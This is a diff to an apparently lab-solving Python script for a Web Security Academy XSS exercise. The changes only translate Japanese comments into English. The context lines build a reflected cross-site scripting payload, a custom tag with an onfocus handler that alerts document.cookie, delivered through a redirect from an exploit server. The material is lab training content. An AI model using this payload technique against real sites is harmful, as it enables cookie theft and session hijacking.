@@ -28,7 +28,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def get_user_inputs():
     """
-    ユーザーに URL とプロキシ情報を入力させる関数
+    Function to prompt the user for URL and proxy information
     """
     lab_url = input(f"{Fore.CYAN}Enter the LAB URL (e.g., https://YOUR-LAB-ID.web-security-academy.net): {Style.RESET_ALL}").strip()
     exploit_server_url = input(f"{Fore.CYAN}Enter the Exploit Server URL (e.g., https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net): {Style.RESET_ALL}").strip()
@@ -51,13 +51,13 @@ def build_xss_payload(lab_url: str) -> str:
     """
     Generate the XSS payload with a custom <xss> tag that triggers alert(document.cookie).
     """
-    # XSS ペイロード（URLエンコード前）
+    # XSS payload (before URL encoding)
     custom_tag = "<xss id=x onfocus=alert(document.cookie) tabindex=1>"
 
-    # クエリパラメータとして渡すためURLエンコード
+    # URL-encode the tag to pass it as a query parameter
     encoded_tag = quote(custom_tag)
 
-    # HTML ペイロード生成
+    ## Generate the HTML payload
     payload = f"""
 <script>
 location = '{lab_url}/?search={encoded_tag}#x';
